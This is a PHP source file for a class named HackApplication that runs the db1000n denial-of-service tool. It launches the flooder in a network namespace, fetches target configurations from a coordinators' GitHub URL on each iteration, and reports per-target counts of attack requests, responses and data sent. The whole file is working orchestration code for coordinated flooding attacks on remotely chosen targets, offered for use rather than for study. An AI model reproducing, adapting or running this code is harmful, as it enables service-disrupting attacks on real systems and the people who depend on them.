<?php

class HackApplication
{
    private $log = '',
            $instantLog = false,
            $process,
            $processPGid,
            $pipes,
            $wasLaunched = false,
            $launchFailed = false,
            $currentCountry = '',
            $netnsName,
            $stat = false,
            $readChildProcessOutput = false,
            $db1000nStdoutBrokenLineCount,
            $db1000nStdoutBuffer;

    public  $logProcessingMetricsArray;

    public function __construct($netnsName)
    {
        $this->netnsName = $netnsName;
    }

    public function processLaunch()
    {
        global $DB1000N_SCALE;

        if ($this->launchFailed) {
            return -1;
        }

        if ($this->wasLaunched) {
            return true;
        }

        $command = "sleep 1 ;   export GOMAXPROCS=1 ;   export SCALE_FACTOR={$DB1000N_SCALE} ;   "
                 . "ip netns exec {$this->netnsName}   "
                 . "nice -n 10   /sbin/runuser -p -u hack-app -g hack-app   --   "
                 . __DIR__ . "/DB1000N/db1000n  --prometheus_on=false  " . static::getCmdArgsForConfig() . '   '
                 . "--log-format=json    2>&1";

        $this->log($command);
        $descriptorSpec = array(
            0 => array("pipe", "r"),  // stdin
            1 => array("pipe", "w"),  // stdout
            2 => array("pipe", "a")   // stderr
        );
        $this->process = proc_open($command, $descriptorSpec, $this->pipes);
        $this->processPGid = procChangePGid($this->process, $log);
        $this->log($log);
        if ($this->processPGid === false) {
            $this->terminate(true);
            $this->log('Command failed: ' . $command);
            $this->launchFailed = true;
            return -1;
        }

        stream_set_blocking($this->pipes[1], false);
        $this->wasLaunched = true;
        return true;
    }

    private function log($message, $noLineEnd = false)
    {
        $message .= $noLineEnd  ?  '' : "\n";
        $this->log .= $message;
        if ($this->instantLog) {
            echo $message;
        }
    }

    public function clearLog()
    {
        $this->log = '';
        $this->db1000nStdoutBuffer = '';
    }

    public function setReadChildProcessOutput($state)
    {
        $this->readChildProcessOutput = $state;
    }

    public function pumpLog() : string
    {
        ResourcesConsumption::startTaskTimeTracking('HackApplicationPumpLog');

        $ret = $this->log;
        $this->log = '';

        if (!$this->readChildProcessOutput) {
            goto retu;
        }

        //------------------- read db1000n stdout -------------------

        $this->db1000nStdoutBuffer .= streamReadLines($this->pipes[1], 0);
        // --- Split lines
        $lines = mbSplitLines($this->db1000nStdoutBuffer);
        // --- Remove empty lines
        $lines = mbRemoveEmptyLinesFromArray($lines);


        foreach ($lines as $lineIndex => $line) {
            $lineObj = json_decode($line);

            if (is_object($lineObj)) {

                unset($lines[$lineIndex]);
                $this->db1000nStdoutBrokenLineCount = 0;
                $ret .= $this->processDb1000nJsonLine($line, $lineObj);

            } else {

                $this->db1000nStdoutBrokenLineCount++;
                if ($this->db1000nStdoutBrokenLineCount > 3) {
                    $this->db1000nStdoutBrokenLineCount = 0;
                    $ret .= $line . "\n";                    
                } else {
                    break;
                }

            }
        }
        $this->db1000nStdoutBuffer = implode("\n", $lines);


        retu:
        $ret = mbRTrim($ret);

        ResourcesConsumption::stopTaskTimeTracking('HackApplicationPumpLog');
        return $ret;
    }

    private function processDb1000nJsonLine($line, $lineObj)
    {
        $ret = '';

        if (
                isset($lineObj->level)
            &&  $lineObj->level === 'info'
            &&  $lineObj->msg   === 'location info'
        ) {
            $this->currentCountry = $lineObj->country;
        }
        //-----------------------------------------------------
        else if (
                isset($lineObj->level)
            &&  $lineObj->level === 'info'
            &&  $lineObj->msg   === 'stats'
        ) {
            if (isset($lineObj->targets)) {
                $this->stat = $lineObj;
            }
        }
        //-----------------------------------------------------
        else if (
               isset($lineObj->level)
            && $lineObj->level === 'info'
            && in_array($lineObj->msg, [
                'running db1000n',
                'attacking',
                'single http request',
                'loading config',
                'the config has not changed. Keep calm and carry on!',
                'new config received, applying',
                'checking IP address,',
                'job instances (re)started'
            ])
        ) {
            // Do nothing
        }
        //-----------------------------------------------------
        else if (
                isset($lineObj->level)
            &&  $lineObj->level === 'warn'
            &&  in_array($lineObj->msg, [
                'error fetching location info',
                'Failed to check the country info'
            ])
        ) {
            // Do nothing
        }
        //-----------------------------------------------------
        else {
            $color = Term::clear;
            if (
                   isset($lineObj->level)
                && $lineObj->level === 'info'
            ) {
                $color = Term::gray;
            }
            $ret .= $this->lineObjectToString($lineObj, $color) . "\n\n";
        }

        return $ret;
    }

    private function lineObjectToString($lineObj, $color = false)
    {
        if (! is_object($lineObj)) {
            return $lineObj;
        }

        $str = mbTrim(print_r($lineObj, true));
        $lines = mbSplitLines($str);
        unset($lines[0]);
        unset($lines[1]);
        unset($lines[array_key_last($lines)]);

        $lines = array_map(
            function ($item) use ($color) {
                $item = mbTrim($item);
                if ($color  &&  $item) {
                    $item = $color . $item . Term::clear;
                }
                return $item;
            }
            ,$lines
        );

        $lines = mbRemoveEmptyLinesFromArray($lines);
        return implode("\n", $lines);
    }

    public function getStatisticsBadge() : ?string
    {
        global $LOG_WIDTH, $LOG_PADDING_LEFT;
        if (!$this->stat  ||  !$this->stat->targets) {
            return null;
        }
        ResourcesConsumption::startTaskTimeTracking('HackApplicationGetStatisticsBadge');

        if (is_object($this->stat->targets)) {
            $targets = get_object_vars($this->stat->targets);
            ksort($targets);
            $this->stat->targets = $targets;
        }

        $columnsDefinition = [
            [
                'title' => ['Target'],
                'width' => $LOG_WIDTH - $LOG_PADDING_LEFT - 11 * 4,
                'trim'  => 4
            ],
            [
                'title' => ['Requests', 'attempted'],
                'width' => 11,
                'alignRight' => true
            ],
            [
                'title' => ['Requests' , 'sent'],
                'width' => 11,
                'alignRight' => true
            ],
            [
                'title' => ['Responses', 'received'],
                'width' => 11,
                'alignRight' => true
            ],
            [
                'title' => ['MiB', 'sent'],
                'width' => 11,
                'alignRight' => true
            ]
        ];
        $rows[] = [];

        $this->stat->db1000nx100 = new stdClass();
        $this->stat->db1000nx100->totalHttpRequests = 0;
        $this->stat->db1000nx100->totalHttpResponses = 0;
        foreach ($this->stat->targets as $targetName => $targetStat) {
            $mibSent = roundLarge($targetStat->bytes_sent / 1024 / 1024);
            $row = [
                $targetName,
                $targetStat->requests_attempted,
                $targetStat->requests_sent,
                $targetStat->responses_received,
                $mibSent
            ];
            $rows[] = $row;

            $pattern = '#^https?:\/\/#';
            if (preg_match($pattern, $targetName, $matches)) {
                $this->stat->db1000nx100->totalHttpRequests  += $targetStat->requests_attempted;
                $this->stat->db1000nx100->totalHttpResponses += $targetStat->responses_received;                
            }
        }

        //------- Total row
        $rows[] = [];  // new line
        $totalMiBSent = roundLarge($this->stat->total->bytes_sent / 1024 / 1024);
        $row = [
            'Total',
            $this->stat->total->requests_attempted,
            $this->stat->total->requests_sent,
            $this->stat->total->responses_received,
            $totalMiBSent
        ];
        $rows[] = $row;

        ResourcesConsumption::stopTaskTimeTracking('HackApplicationGetStatisticsBadge');
        return mbRTrim(generateMonospaceTable($columnsDefinition, $rows));
    }

    // Should be called after getLog()
    public function getEfficiencyLevel()
    {

        if (!$this->stat  ||  !$this->stat->targets  ||  !count($this->stat->targets)) {
            return null;
        }

        $requests = $this->stat->db1000nx100->totalHttpRequests;
        $responses = $this->stat->db1000nx100->totalHttpResponses;

        if (! $requests) {
            return null;
        }

        $averageResponseRate = $responses * 100 / $requests;
        return roundLarge($averageResponseRate);
    }

    // Should be called after getLog()
    public function getCurrentCountry()
    {
        return $this->currentCountry;
    }

    public function isAlive()
    {
        return isProcAlive($this->process);
    }

    // Only first call of this function return real value, next calls return -1
    public function getExitCode()
    {
        $processStatus = proc_get_status($this->process);
        return $processStatus['exitcode'];
    }

    public function terminate($hasError = false)
    {
        global $LOG_BADGE_WIDTH;

        if ($this->processPGid) {
            $this->log("db1000n SIGTERM PGID -{$this->processPGid}");
            @posix_kill(0 - $this->processPGid, SIGTERM);
        }
        @proc_terminate($this->process);
    }

    public function getProcess()
    {
        return $this->process;
    }

    // ----------------------  Static part of the class ----------------------

    private static $configUrl,
                   $localConfigPath,
                   $useLocalConfig;

    public static function constructStatic()
    {
        global $TEMP_DIR;
        static::$configUrl = 'https://raw.githubusercontent.com/db1000n-coordinators/LoadTestConfig/main/config.v0.7.json';
        static::$localConfigPath = $TEMP_DIR . '/db1000n-config.json';
        static::$useLocalConfig = false;
    }

    private static function loadConfig()
    {
        $config = httpGet(static::$configUrl, $httpCode);
        if ($config !== false) {
            MainLog::log("Config file for db1000n downloaded from " . static::$configUrl);
            file_put_contents_secure(static::$localConfigPath, $config);
			chmod(static::$localConfigPath, changeLinuxPermissions(0, 'rw', 'r', 'r'));
        } else {
            MainLog::log("Failed to downloaded config file for db1000n");
        }
    }

    private static function getCmdArgsForConfig()
    {
        if (! static::$useLocalConfig) {
            return '';
        }

        return ' -c="' . static::$localConfigPath . '" ';
    }
    
    public static function newIteration()
    {
        @unlink(static::$localConfigPath);
        static::loadConfig();
        if (file_exists(static::$localConfigPath)) {
            static::$useLocalConfig = true;
        } else {
            static::$useLocalConfig = false;
        }
    }
}

HackApplication::constructStatic();